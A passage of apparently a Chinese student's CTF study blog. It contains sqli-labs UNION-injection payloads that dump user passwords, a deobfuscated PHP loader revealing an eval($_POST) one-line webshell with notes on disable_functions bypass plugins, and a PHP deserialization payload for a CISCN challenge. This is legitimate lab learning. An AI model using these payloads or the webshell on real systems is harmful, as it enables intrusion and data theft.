<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-30</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">3</span>&amp;id=<span class="hljs-number">0</span>&quot;union select 1,2,3--+<br><br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>看了源码还差点找不到注入点😥….</p>
<h1 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h1><p>waf<br>闭合点</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-31</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span>&quot;) union select 1,2,3--+<br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;)<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>按原计划，sql-labs的学习就先到这，下面sql注入的学习该去做ctf真题了，不得不说sqli-labs的帮助真挺大，能打好sql注入的原理和基础</p>
<hr>
<h2 id="title-note-15date-2025-03-20-19-43-49tags-review"><a href="#title-note-15date-2025-03-20-19-43-49tags-review" class="headerlink" title="title: note-15date: 2025-03-20 19:43:49tags: review"></a>title: note-15<br>date: 2025-03-20 19:43:49<br>tags: review</h2><h1 id="2024下半年长城杯回顾"><a href="#2024下半年长城杯回顾" class="headerlink" title="2024下半年长城杯回顾"></a>2024下半年长城杯回顾</h1><p>在机房上从新回顾3个月前的长城杯web题wp，发现已经能看懂不少了  </p>
<h2 id="追忆1-hello-web"><a href="#追忆1-hello-web" class="headerlink" title="追忆1 hello_web"></a>追忆1 hello_web</h2><p>还记得当初做这题就是在那干瞪眼，用dirsearch和查看前端认出了个hackme.php。<br>已经没有题目环境了，干看大佬的wp<br><a target="_blank" rel="noopener" href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p>
<p>那大概就是双写..&#x2F;进行绕过来目录穿越访问到tips和hackme<br><strong>(主要是要学一下面对未知环境时该怎么办，现在还没有一套渗透流程，起手fuzz都fuzz不明白)</strong>   </p>
<p>然后能在tips看到phpinfo和过滤内容<br>然后是hackme.php  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$YwzIst</span>(<span class="hljs-string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>看到大佬们说给反混淆一下就行了，我搞了两节课大约一个半小时才搞明白😫…..<br>步骤就是先按php的分号给分明白代码行，然后尝试用厨子解码里面看不懂的东西</p>
<p>这是我搞的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<br><span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<br><span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-comment">//eval($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));</span><br><span class="hljs-variable">$uWcdaA</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox==&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br></code></pre></td></tr></table></figure>
<p>其中一些变量扔厨子也煮不出来，看佬们wp也是不动它们，<br>重要是不知道要echo的东西大佬们是怎么知道的，又去找一大堆wp，好像都是默认知道要echo啥一样，最后自己仔细看了一遍发现就是把base解码出来的eval里的内容echo出来😫。。。   </p>
<p><strong>即使蠢如猪豚我也要在ctf走下去口牙！我就是这样的哈基尸啊</strong>  </p>
<p>最后运行结果好像输出一大串css还是html的东西，但是最后有一句话木马，get到密码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/code&gt;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd_66.99&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>最后是连木马，但是注意要用蚁剑的UserFilter插件，这个是针对php7版本的绕过插件<br><a target="_blank" rel="noopener" href="https://hcnote.cn/2024/12/25/12056.html">https://hcnote.cn/2024/12/25/12056.html</a><br>也可以用其它插件来绕过disable_fuction<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DumpInfou/p/18023278">https://www.cnblogs.com/DumpInfou/p/18023278</a><br><a target="_blank" rel="noopener" href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p>
<p>linux下搜索flag字符</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span> -<span class="hljs-built_in">type</span> f <span class="hljs-number">2</span>&gt;/dev/null<br><br>grep -rvh ‘<span class="hljs-built_in">flag</span>’<br></code></pre></td></tr></table></figure>



<hr>
<h2 id="title-note-16date-2025-03-22-22-39-23tags-unserialize"><a href="#title-note-16date-2025-03-22-22-39-23tags-unserialize" class="headerlink" title="title: note-16date: 2025-03-22 22:39:23tags: unserialize"></a>title: note-16<br>date: 2025-03-22 22:39:23<br>tags: unserialize</h2><h1 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]));<br></code></pre></td></tr></table></figure>
<p>审计：<br>大概是三个变量a,b,file，还有一个反序列化激活的 __wakeup(),先是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>不让用数组绕过<br>然后是绕过条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure>
<p>要求a和b弱比较不同，&amp;&amp;a和b的md5和sha1值相同<br>然后看不懂了  </p>
<blockquote>
<p>分析：<br>（1）wakeup方法首先禁用了数组，所以不能给成员变量a和b赋值数组，需要使用其他方法绕过下面的md5和sha1。<br>（2）因为比较变量使用的是弱比较（!&#x3D;&#x3D;），则我们可以给a、b赋值同值不同类，例如a&#x3D;1、b&#x3D;’1’，二者md5值和sha1值相同，可以通过检查。<br>（3）变量content接受经过date日期格式化后的变量file。<br>对于date()方法：<br>该方法会检测传入的字符串中是否有特定的格式化字符，如Y（年份）、m（月份）、d（天）、H（时）、i（分钟）、s（秒）等<br>检测存在则会将格式化字符替换为当前时间的对应部分，否则将字符进行原样输出，同时可用转义字符将格式化字符原样输出<br>（4）uniqid()方法会生成一个唯一的文件名，并与后缀“.txt”拼接成变量uuid。<br>（5）file_put_contents()方法会将content的内容写入uuid表示的文本文档中。对文本文档的内容进行正则匹配，去除内容中的空格和换行符，赋值给变量打他。<br>（6）显示变量data的内容。<br>综上，我们需要绕过检测，为变量file赋值一个不会被date方法格式化的flag路径，读取到flag后，借由变量data显示出来。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p>
</blockquote>
<p>重要的来了<br>KIMI:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">//作用：尝试将$data作为文件路径，读取该路径下的文件内容并输出到浏览器。这里可能存在路径遍历或文件包含漏洞，如果$data的值可控且未经过充分验证。</span><br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br><span class="hljs-comment">//作用：读取刚刚创建的$uuid文件的内容，并使用正则表达式preg_replace()去除其中的空白字符（包括空格、换行符等）。最终结果存储在$data变量中。</span><br></code></pre></td></tr></table></figure>
<p>最后payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-comment">//同值不同类，通过三个检测</span><br><span class="hljs-variable">$a</span>-&gt;a=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$a</span>-&gt;b=<span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-comment">//此处file的内容在经过data()方法格式化后显示为/flag</span><br><span class="hljs-variable">$a</span>-&gt;file=<span class="hljs-string">&quot;/f\l\a\g&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//输出:Tzo0OiJkYXRlIjozOntzOjE6ImEiO2k6MTtzOjE6ImIiO3M6MToiMSI7czo0OiJmaWxlIjtzOjg6Ii9mXGxcYVxnIjt9</span><br><br></code></pre></td></tr></table></figure>
<p>by <a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p>
<h2 id="值同类不同"><a href="#值同类不同" class="headerlink" title="值同类不同"></a>值同类不同</h2><p>$this-&gt;a !&#x3D;&#x3D; $this-&gt;b：  </p>
<p>$this-&gt;a 是整数 1，$this-&gt;b 是字符串 ‘1’。在 PHP 中，它们的值虽然相等，但类型不同，因此 !&#x3D;&#x3D; 比较结果为 true。</p>
<p>md5($this-&gt;a) &#x3D;&#x3D;&#x3D; md5($this-&gt;b)：</p>
<p>当你将整数 1 传递给 md5() 函数时，PHP 会将其转换为字符串 ‘1’，因此 md5(1) 和 md5(‘1’) 的结果是相同的。</p>
<p>sha1($this-&gt;a) &#x3D;&#x3D;&#x3D; sha1($this-&gt;b)：</p>
<p>同样，sha1() 函数也会将整数 1 转换为字符串 ‘1’，因此 sha1(1) 和 sha1(‘1’) 的结果也是相同的。</p>
<hr>
<h2 id="title-note-17date-2025-03-23-13-38-39tags-unseirlize"><a href="#title-note-17date-2025-03-23-13-38-39tags-unseirlize" class="headerlink" title="title: note-17date: 2025-03-23 13:38:39tags: unseirlize"></a>title: note-17<br>date: 2025-03-23 13:38:39<br>tags: unseirlize</h2><h1 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1><p>没想到我也有能秒反序列化的一天，还以为永远入不了门了<br>拿到题目发现只有一个静态页面<br>然后dirsearch扫</p>
